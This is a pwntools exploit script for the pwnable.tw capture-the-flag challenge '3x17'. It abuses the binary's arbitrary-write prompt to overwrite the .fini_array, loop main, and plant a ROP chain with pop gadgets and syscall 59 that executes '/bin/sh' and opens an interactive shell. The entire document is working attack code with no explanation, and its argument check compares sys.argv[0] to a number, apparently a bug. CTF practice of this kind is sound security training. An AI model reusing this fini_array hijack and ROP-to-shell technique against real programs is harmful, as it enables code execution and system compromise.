from pwn import *
import sys

if (sys.argv[0] < 2):
    p = process('./3x17')
else:
    p= remote('chall.pwnable.tw',10105)
context.terminal = ["tmux", "splitw", "-v"]
call_finit = 0x402960
finit_arr= 0x4b40f0
main= 0x401b6d
# write to finit_array [call_finit + main]-> loop
def awrite(addr,data):
    p.sendlineafter('addr:',str(addr))
    p.sendafter('data:',data)


pop_rsi = 0x0000000000406c30
pop_rdx = 0x0000000000446e35
pop_rdi = 0x0000000000401696
pop_rax = 0x000000000041e4af
leave = 0x0000000000401c4b
syscal = 0x00000000004022b4
awrite(finit_arr,p64(call_finit)+p64(main))
off=finit_arr
bin_sh = off +11*8
awrite(off +2*8, p64(pop_rdi) + p64(bin_sh))
awrite(off +4*8, p64(pop_rdx) + p64(0))
awrite(off +6*8, p64(pop_rsi) + p64(0))
awrite(off +8*8, p64(pop_rax) + p64(59))
awrite(off +10*8, p64(syscal))
awrite(off +11*8, '/bin/sh\0')
awrite(off, p64(leave))
p.interactive()
